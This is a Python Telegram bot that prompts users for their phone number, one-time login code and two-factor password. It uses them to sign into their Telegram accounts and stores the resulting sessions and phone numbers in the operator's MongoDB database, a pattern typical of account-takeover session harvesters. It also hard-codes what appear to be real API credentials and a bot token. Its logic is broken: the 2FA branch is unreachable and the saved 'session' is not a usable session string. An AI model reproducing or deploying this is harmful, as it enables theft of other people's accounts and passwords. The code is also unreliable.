import os
from telegram.ext import ApplicationBuilder, MessageHandler, filters
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from pymongo import MongoClient

# MongoDB connection URL (get it from MongoDB Atlas)
MONGO_URL = os.getenv('MONGO_URL')

# Your API credentials from https://my.telegram.org
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# MongoDB client and database setup
client = MongoClient(MONGO_URL)
db = client['telegram_sessions']
sessions_collection = db['sessions']

# Temporary state storage
user_states = {}

async def message_handler(update, context):
    user_id = update.message.from_user.id
    text = update.message.text.strip()

    if user_id not in user_states:
        # First step: user sends phone number
        user_states[user_id] = {
            'phone': text,
            'step': 'waiting_for_otp'
        }

        # Create Telethon client for user
        telegram_client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
        await telegram_client.connect()
        user_states[user_id]['client'] = telegram_client

        try:
            await telegram_client.send_code_request(text)
            await update.message.reply_text("📩 OTP has been sent to your Telegram. Please enter the OTP code:")
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending OTP: {e}")
            await telegram_client.disconnect()
            del user_states[user_id]

    elif user_states[user_id]['step'] == 'waiting_for_otp':
        # Second step: user sends OTP
        telegram_client = user_states[user_id]['client']
        phone = user_states[user_id]['phone']
        otp = text

        try:
            await telegram_client.sign_in(phone=phone, code=otp)
            await telegram_client.disconnect()

            # Save session to MongoDB
            session_data = {
                'user_id': user_id,
                'phone': phone,
                'session_data': str(user_states[user_id]['client'])
            }
            sessions_collection.insert_one(session_data)

            await update.message.reply_text("✅ Session created and saved to MongoDB!")
            print(f"[+] Session created for {phone} and saved to MongoDB.")

        except SessionPasswordNeededError:
            # 2FA enabled, request password
            user_states[user_id]['step'] = 'waiting_for_2fa_password'
            await update.message.reply_text("🔒 2FA is enabled on this account. Please enter your 2FA password:")

        except Exception as e:
            await update.message.reply_text(f"❌ Error logging in: {e}")
            await telegram_client.disconnect()

        # Cleanup user state
        if user_id in user_states:
            del user_states[user_id]

    elif user_states[user_id]['step'] == 'waiting_for_2fa_password':
        # Handle 2FA password input
        telegram_client = user_states[user_id]['client']
        phone = user_states[user_id]['phone']
        password = text

        try:
            await telegram_client.sign_in(password=password)
            
            # Save session to MongoDB after 2FA verification
            session_data = {
                'user_id': user_id,
                'phone': phone,
                'session_data': str(user_states[user_id]['client'])
            }
            sessions_collection.insert_one(session_data)

            await telegram_client.disconnect()
            await update.message.reply_text("✅ 2FA password verified. Session created and saved to MongoDB!")
            print(f"[+] 2FA password verified for {phone} and saved to MongoDB.")

        except Exception as e:
            await update.message.reply_text(f"❌ Error with 2FA password: {e}")
            await telegram_client.disconnect()

        # Cleanup user state
        if user_id in user_states:
            del user_states[user_id]

# Main function
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
